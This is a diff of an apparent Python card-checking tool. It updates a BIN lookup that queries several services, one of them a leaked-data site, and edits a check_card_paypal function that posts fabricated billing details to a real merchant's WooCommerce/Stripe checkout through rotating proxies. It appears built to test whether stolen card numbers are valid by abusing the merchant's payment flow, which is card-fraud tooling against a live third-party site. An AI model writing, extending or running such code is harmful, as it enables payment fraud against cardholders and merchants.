@@ -42,82 +42,128 @@ def get_random_proxy():
         print(f"Error reading proxy file: {str(e)}")
         return None
 
+# BIN lookup function - UPDATED with reliable APIs
 def get_bin_info(bin_number):
-    """BIN lookup function similar to p.py"""
+    """Get BIN information using reliable APIs without proxies"""
     if not bin_number or len(bin_number) < 6:
-        return get_smart_fallback(bin_number)
+        return {
+            'bank': 'Unavailable',
+            'country': 'Unknown',
+            'brand': 'Unknown',
+            'type': 'Unknown',
+            'level': 'Unknown',
+            'emoji': '🏳️'
+        }
+    
+    bin_code = bin_number[:6]
     
     try:
-        response = requests.get(
-            f'https://lookup.binlist.net/{bin_number}', 
-            timeout=3,
-            headers={"Accept-Version": "3", "User-Agent": get_rotating_user_agent()}
-        )
-        if response.status_code == 200:
-            data = response.json()
-            if data and data.get('scheme'):
-                return format_binlist_data(data)
+        # Try multiple reliable BIN lookup APIs in sequence
+        apis = [
+            f"https://bin-ip-checker.p.rapidapi.com/?bin={bin_code}",
+            f"https://bins.antipublic.cc/bins/{bin_code}",
+            f"https://lookup.binlist.net/{bin_code}"
+        ]
+        
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
+        
+        bin_info = {}
+        
+        for api_url in apis:
+            try:
+                response = requests.get(api_url, headers=headers, timeout=10, verify=False)
+                
+                if response.status_code == 200:
+                    data = response.json()
+                    
+                    # Parse different API response formats
+                    if 'bin-ip-checker.p.rapidapi.com' in api_url:
+                        # RapidAPI format
+                        if data.get('success'):
+                            result = data.get('result', {})
+                            bin_info = {
+                                'bank': result.get('bank', {}).get('name', 'Unavailable'),
+                                'country': result.get('country', {}).get('name', 'Unknown'),
+                                'brand': result.get('scheme', 'Unknown'),
+                                'type': result.get('type', 'Unknown'),
+                                'level': result.get('level', 'Unknown'),
+                                'emoji': get_country_emoji(result.get('country', {}).get('code', ''))
+                            }
+                            break
+                    
+                    elif 'antipublic.cc' in api_url:
+                        # Antipublic format
+                        result = data.get('data', {})
+                        if result:
+                            bin_info = {
+                                'bank': result.get('bank', 'Unavailable'),
+                                'country': result.get('country', 'Unknown'),
+                                'brand': result.get('vendor', 'Unknown'),
+                                'type': result.get('type', 'Unknown'),
+                                'level': result.get('level', 'Unknown'),
+                                'emoji': get_country_emoji(result.get('country_code', ''))
+                            }
+                            break
+                    
+                    elif 'binlist.net' in api_url:
+                        # Binlist format
+                        if data:
+                            bin_info = {
+                                'bank': data.get('bank', {}).get('name', 'Unavailable'),
+                                'country': data.get('country', {}).get('name', 'Unknown'),
+                                'brand': data.get('scheme', 'Unknown'),
+                                'type': data.get('type', 'Unknown'),
+                                'level': data.get('brand', 'Unknown'),  # binlist doesn't have level
+                                'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
+                            }
+                            break
+                            
+            except Exception as e:
+                print(f"BIN API {api_url} failed: {str(e)}")
+                continue
+        
+        # If all APIs failed, return default values
+        if not bin_info:
+            bin_info = {
+                'bank': 'Unavailable',
+                'country': 'Unknown',
+                'brand': 'Unknown',
+                'type': 'Unknown',
+                'level': 'Unknown',
+                'emoji': '🏳️'
+            }
+        
+        # Clean up the values
+        for key in ['bank', 'country', 'brand', 'type', 'level']:
+            if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None']:
+                bin_info[key] = 'Unknown'
+        
+        return bin_info
+        
+    except Exception as e:
+        print(f"BIN lookup error: {str(e)}")
+        return {
+            'bank': 'Unavailable',
+            'country': 'Unknown',
+            'brand': 'Unknown',
+            'type': 'Unknown',
+            'level': 'Unknown',
+            'emoji': '🏳️'
+        }
+
+def get_country_emoji(country_code):
+    """Convert country code to emoji"""
+    if not country_code or len(country_code) != 2:
+        return '🏳️'
+    
+    try:
+        # Convert to uppercase and get emoji
+        country_code = country_code.upper()
+        return ''.join(chr(127397 + ord(char)) for char in country_code)
     except:
-        pass
-    
-    return get_enhanced_pattern_info(bin_number)
-
-def format_binlist_data(data):
-    """Format data from binlist APIs"""
-    bank_name = data.get('bank', {}).get('name', 'UNKNOWN')
-    if bank_name in ['', 'UNKNOWN', None]:
-        bank_name = 'MAJOR BANK'
-    
-    country_name = data.get('country', {}).get('name', 'UNITED STATES')
-    country_emoji = data.get('country', {}).get('emoji', '🇺🇸')
-    
-    return {
-        'brand': data.get('scheme', 'UNKNOWN').upper(),
-        'type': data.get('type', 'CREDIT').upper(),
-        'level': data.get('brand', data.get('scheme', 'UNKNOWN')).upper(),
-        'bank': bank_name,
-        'country': country_name,
-        'emoji': country_emoji
-    }
-
-def get_enhanced_pattern_info(bin_number):
-    """Enhanced pattern matching"""
-    brand = get_bin_brand_from_pattern(bin_number)
-    
-    return {
-        'brand': brand,
-        'type': 'CREDIT',
-        'level': 'STANDARD',
-        'bank': f'{brand} ISSUING BANK',
-        'country': 'UNITED STATES',
-        'emoji': '🇺🇸'
-    }
-
-def get_smart_fallback(bin_number):
-    """Smart fallback with realistic data"""
-    brand = get_bin_brand_from_pattern(bin_number) if bin_number else 'VISA'
-    
-    return {
-        'brand': brand,
-        'type': 'CREDIT',
-        'level': 'STANDARD',
-        'bank': f'{brand} ISSUING BANK',
-        'country': 'UNITED STATES',
-        'emoji': '🇺🇸'
-    }
-
-def get_bin_brand_from_pattern(bin_number):
-    """Basic brand detection"""
-    if bin_number.startswith('4'):
-        return 'VISA'
-    elif bin_number.startswith('5'):
-        return 'MASTERCARD'
-    elif bin_number.startswith('34') or bin_number.startswith('37'):
-        return 'AMEX'
-    elif bin_number.startswith('6'):
-        return 'DISCOVER'
-    else:
-        return 'UNKNOWN'
+        return '🏳️'
 
 def check_status_paypal(result):
     """Check PayPal payment status similar to p.py's check_status"""
@@ -325,7 +371,7 @@ def check_card_paypal(cc_line):
         }
 
         params = {'wc-ajax': 'update_order_review'}
-        data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone_num}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
+        data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone_num}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
 
         try:
             response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, proxies=proxy, verify=False)
